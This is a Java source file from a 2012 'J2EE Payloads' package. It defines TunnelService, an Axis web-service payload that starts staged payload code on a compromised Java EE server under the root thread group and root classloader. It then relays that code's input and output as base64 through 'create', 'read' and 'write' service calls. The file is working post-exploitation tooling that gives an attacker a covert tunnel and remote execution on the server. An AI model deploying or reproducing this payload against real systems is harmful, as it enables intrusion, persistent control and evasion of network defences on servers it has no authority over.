/*
 * J2EE Payloads.
 * 
 * Copyright (c) 2012 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package j2eepayload.axis;

import j2eepayload.dynstager.DynstagerSupport;

import java.io.InputStream;
import java.io.OutputStream;
import java.io.PipedInputStream;
import java.io.PipedOutputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.NoSuchElementException;

import jtcpfwd.util.PollingHandler;
import sun.misc.BASE64Decoder;
import sun.misc.BASE64Encoder;

public class TunnelService extends PayloadService {

	private static final List/* <PollingHandler> */allHandlers = new ArrayList();

	public String dispatch(String command, String arguments) throws PayloadException {
		try {
			if (command.equals("create")) {
				return "" + create(arguments);
			} else if (command.equals("read")) {
				String[] args = arguments.split(",");
				byte[] b = read(Integer.parseInt(args[0]), Integer.parseInt(args[1]), Integer.parseInt(args[2]));
				if (b == null)
					return "null";
				else
					return "data:" + new BASE64Encoder().encode(b).replaceAll("[\r\n]", "");
			} else if (command.equals("write")) {
				String[] args = arguments.split(",");
				return ("" + write(Integer.parseInt(args[0]), Integer.parseInt(args[1]), new BASE64Decoder().decodeBuffer(args[2])));
			} else {
				return super.dispatch(command, arguments);
			}
		} catch (PayloadException ex) {
			throw ex;
		} catch (Throwable t) {
			throw new PayloadException(t);
		}
	}

	public Void execute(String cmd) throws PayloadException {
		return super.execute(cmd);
	}

	public int create(String createParam) throws PayloadException {
		try {
			PipedOutputStream pos = new PipedOutputStream();
			PollingHandler handler = new PollingHandler(pos, 1048576);
			final String[] args = createParam.split(" ");
			ThreadGroup tg = Thread.currentThread().getThreadGroup();
			while (tg.getParent() != null)
				tg = tg.getParent();
			PayloadRunner runner = new PayloadRunner(tg, new PipedInputStream(pos), handler, args);
			ClassLoader cl = runner.getContextClassLoader();
			while (cl.getParent() != null)
				cl = cl.getParent();
			runner.setContextClassLoader(cl);
			runner.start();
			try {
				runner.join(1000);
			} catch (InterruptedException ex) {
			}
			Exception exception = runner.getException();
			if (exception != null)
				throw exception;
			synchronized (allHandlers) {
				int id = allHandlers.size();
				allHandlers.add(handler);
				return id;
			}
		} catch (Throwable t) {
			throw new PayloadException(t);
		}
	}

	public byte[] read(int id, int timeout, int offset) throws PayloadException {
		try {
			PollingHandler handler = getHandler(id);
			int generation = handler.setSendOffset(offset);
			byte[] data = handler.getSendBytes(timeout, -1, false, generation);
			if (data == null) {
				synchronized (allHandlers) {
					allHandlers.set(id, null);
					while (id == allHandlers.size() - 1 && allHandlers.get(id) == null) {
						allHandlers.remove(id);
						id--;
					}
				}
			}
			return data;
		} catch (Throwable t) {
			throw new PayloadException(t);
		}
	}

	public int write(int id, int offset, byte[] data) throws PayloadException {
		try {
			PollingHandler handler = getHandler(id);
			if (offset != -1)
				handler.setReceiveOffset(offset);
			handler.receiveBytes(data, 0, data.length);
			return data.length;
		} catch (Throwable t) {
			throw new PayloadException(t);
		}
	}

	private PollingHandler getHandler(int id) {
		synchronized (allHandlers) {
			Object handler = allHandlers.get(id);
			if (handler == null)
				throw new NoSuchElementException();
			return (PollingHandler) handler;
		}
	}

	public static class PayloadRunner extends Thread {
		private final String[] args;
		private Exception exception;
		private final InputStream in;
		private final OutputStream out;

		private PayloadRunner(ThreadGroup tg, InputStream in, OutputStream out, String[] args) {
			super(tg, (Runnable) null);
			this.in = in;
			this.out = out;
			this.args = args;
		}

		public void run() {
			try {
				DynstagerSupport.run(in, out, args);
			} catch (Exception ex) {
				exception = ex;
			}
		}

		public Exception getException() {
			return exception;
		}
	}
}
